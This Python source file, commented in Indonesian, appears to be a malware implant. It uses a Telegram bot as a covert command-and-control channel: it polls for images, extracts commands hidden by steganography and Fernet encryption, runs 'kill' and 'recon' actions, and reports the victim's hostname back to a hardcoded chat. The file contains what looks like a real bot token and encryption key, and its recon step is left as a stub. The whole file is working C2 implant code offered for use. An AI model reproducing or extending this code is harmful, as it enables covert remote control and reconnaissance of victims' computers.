import requests
from PIL import Image
import io
from cryptography.fernet import Fernet
import stepic
import sys
import subprocess
import os
from os import path
import time
import random
import platform
import shutil
import mss
import mss.tools
import win32api

# ==================== CONFIGURATION ====================
key = b'7H0RviHlSUDJ8ug1xf0lm5ZO_JZjWketfjcZ9gzaYZU='
TELKEN = '8210714938:AAHAbovQzWwlr8ZRTGyBvAwCh4QOArFILY4'
CHAID = '5457823680'

# ==================== TELEGRAM FUNCTIONS ====================

def get_latest_command(last_update_id):
    """
    Mengambil file dari Telegram. 
    Menggunakan offset agar hanya memproses pesan yang benar-benar baru.
    """
    try:
        url = f"https://api.telegram.org/bot{TELKEN}/getUpdates"
        # Offset + 1 memastikan kita hanya mengambil pesan setelah ID terakhir yang diproses
        params = {'offset': last_update_id + 1, 'timeout': 30}
        response = requests.get(url, params=params, timeout=35)
        
        if response.status_code == 200:
            data = response.json()
            if data['ok'] and data['result']:
                for update in data['result']:
                    current_id = update['update_id']
                    msg = update.get('message', {})
                    
                    # 1. Cek apakah ada DOCUMENT (Cara kirim Program 1)
                    file_id = None
                    if 'document' in msg:
                        file_id = msg['document']['file_id']
                        print(f"[*] Dokumen ditemukan di update {current_id}")
                    
                    # 2. Jika tidak ada dokumen, cek apakah ada PHOTO (Fallback)
                    elif 'photo' in msg:
                        file_id = msg['photo'][-1]['file_id']
                        print(f"[*] Foto ditemukan di update {current_id}")

                    if file_id:
                        # Dapatkan URL path dari file_id
                        file_info = requests.get(f"https://api.telegram.org/bot{TELKEN}/getFile", params={'file_id': file_id}).json()
                        if file_info['ok']:
                            file_path = file_info['result']['file_path']
                            full_url = f"https://api.telegram.org/file/bot{TELKEN}/{file_path}"
                            return full_url, current_id
                    
                    # Jika pesan tidak berisi gambar, tetap update ID-nya agar tidak dibaca lagi
                    return "NO_IMAGE", current_id
                    
        return None, last_update_id
    except Exception as e:
        print(f"[-] Error Polling: {e}")
        return None, last_update_id

def decode_stego(url):
    """Download gambar dan ambil pesan tersembunyi"""
    try:
        resp = requests.get(url, timeout=30)
        if resp.status_code == 200:
            img = Image.open(io.BytesIO(resp.content))
            message = stepic.decode(img)
            return message
    except Exception as e:
        print(f"[-] Decode Error: {e}")
        return None

def decrypt_cmd(enctext):
    """Dekripsi pesan Fernet"""
    try:
        f = Fernet(key)
        return f.decrypt(enctext.encode()).decode()
    except:
        return None

def send_resp(text):
    """Kirim balik status ke Telegram"""
    requests.post(f"https://api.telegram.org/bot{TELKEN}/sendMessage", 
                  json={'chat_id': CHAID, 'text': f"🤖 [{platform.node()}] {text}"})

# ==================== RECON LOGIC (Simplified for Example) ====================

def run_recon(api_key):
    # Logika recon Anda di sini (Screenshot, systeminfo, dll)
    # Untuk testing, kita kirim pesan sukses saja
    time.sleep(2) 
    return "Recon completed successfully."

# ==================== MAIN LOOP ====================

def main():
    print(f"[*] Perangkat: {platform.node()}")
    print("[*] Menghubungkan ke Telegram C2...")
    
    # Inisialisasi: Lewati semua pesan lama yang ada di antrean saat ini
    initial_url = f"https://api.telegram.org/bot{TELKEN}/getUpdates"
    init_resp = requests.get(initial_url).json()
    last_id = 0
    if init_resp['ok'] and init_resp['result']:
        last_id = init_resp['result'][-1]['update_id']
    
    send_resp("Implant ONLINE. Menunggu perintah...")
    print(f"[*] Siap. (Update ID Terakhir: {last_id})")

    while True:
        try:
            # Cari perintah baru
            file_url, new_id = get_latest_command(last_id)
            last_id = new_id # Update ID agar tidak memproses pesan ini lagi

            if file_url and file_url != "NO_IMAGE":
                print(f"[+] File baru ditemukan! Mendownload...")
                raw_payload = decode_stego(file_url)
                
                if raw_payload:
                    command_text = decrypt_cmd(raw_payload)
                    if command_text:
                        print(f"[!] Perintah diterima: {command_text}")
                        
                        parts = command_text.split(" ", 1)
                        cmd = parts[0]
                        arg = parts[1] if len(parts) > 1 else None

                        if cmd == 'kill':
                            send_resp("Implant dimatikan.")
                            sys.exit(0)
                        elif cmd == 'recon':
                            send_resp("Memulai Recon...")
                            res = run_recon(arg)
                            send_resp(res)
                    else:
                        print("[-] Gagal dekripsi (Key mungkin salah).")
                else:
                    print("[-] Gambar tidak mengandung pesan steganografi.")
            
            time.sleep(5) # Cek setiap 5 detik

        except Exception as e:
            print(f"[-] Error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    main()